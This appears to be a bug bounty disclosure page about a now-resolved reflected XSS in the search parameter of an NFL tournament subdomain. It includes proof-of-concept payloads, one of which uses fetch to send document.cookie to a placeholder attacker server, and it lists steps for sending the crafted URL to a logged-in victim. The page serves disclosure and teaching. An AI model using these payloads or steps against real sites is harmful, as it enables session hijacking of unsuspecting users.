---
layout: default
---

<div class="container">
<article>
  <a href="../../../en/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>NFL: Reflected XSS in URL Search Query</h1>
    <p style="color: var(--p3); font-weight: 600;">National Football League (NFL) - Digital Infrastructure</p>
  </div>

  <div class="bounty-content">
    <h2>🎯 Vulnerability Summary</h2>
    <p>We identified a Reflected Cross-Site Scripting (XSS) vulnerability on the public-facing domain <code>hbcutournament.nfl.com</code>. The vulnerability resides in the search results page URL fragment (<code>?q=</code>) parameter, which improperly processes user-supplied input without adequate sanitization.</p>

    <h2>⚙️ Affected URLs</h2>
    <pre><code>https://hbcutournament.nfl.com/resources?q=
https://hbcutournament.nfl.com/blogs?q=</code></pre>

    <h2>🛠️ Proof of Concept Payloads</h2>
    
    <h3>HTML Injection</h3>
    <p>The first thing we tried in the search field was a simple HTML injection:</p>
    <pre><code>&lt;h1&gt;This is a HTML Injection test&lt;/h1&gt; --- This is a normal text.</code></pre>
    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - HTML Injection.png" alt="HTML Injection">

    <h3>Reflected XSS</h3>
    <p>After testing several payloads, we discovered that the <code>&lt;img&gt;</code> tag works:</p>
    <pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Alert 1.png" alt="Alert Proof">

    <h3>Reflected XSS with Cookies exfiltration</h3>
    <p>After verifying that we could execute JavaScript code, we attempted to exfiltrate cookies to steal session data.</p>
    <pre><code>&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></pre>
    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration.png" alt="Cookies Exfiltration Payload">
    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration Result.png" alt="Exfiltration Result">

    <h2>🚀 Steps to Reproduce</h2>
    <ol>
      <li>Start a local Web Server: <code>python3 -m http.server 8000</code></li>
      <li>Expose it publicly (e.g., using Serveo): <code>ssh -R 80:localhost:8000 serveo.net</code></li>
      <li>Prepare the malicious URL with your server address.</li>
      <li>Share the URL with an authenticated user.</li>
      <li>Receive victim cookies in your side.</li>
    </ol>

    <h2>🤝 Collaboration Details</h2>
    <p>This research was conducted in a joint effort with the following researchers:</p>
    <ul>
      <li><strong>{{ site.researchers.ivan.name }}</strong> (Lead Researcher)</li>
      <li><strong>{{ site.researchers.diego.name }}</strong> (Security Analyst)</li>
    </ul>

    <div class="card-grid" style="margin-top: 3rem;">
      <div class="glass-card">
        <small>Status</small>
        <strong>Resolved & Verified</strong>
      </div>
      <div class="glass-card">
        <small>Severity</small>
        <strong>High (reported as P3)</strong>
      </div>
    </div>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Zoomed Image">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
